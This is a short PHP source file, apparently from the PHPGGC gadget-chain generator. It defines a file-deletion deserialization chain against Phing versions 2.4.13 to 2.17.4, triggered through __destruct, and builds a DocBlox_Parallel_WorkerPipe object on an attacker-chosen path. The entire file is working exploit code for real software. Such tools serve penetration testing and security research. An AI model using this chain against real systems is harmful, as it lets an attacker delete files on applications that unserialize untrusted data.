<?php

namespace GadgetChain\Phing;

class FD2 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '2.4.13 <= 2.17.4';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        return new \DocBlox_Parallel_WorkerPipe($parameters['remote_path']);
    }
}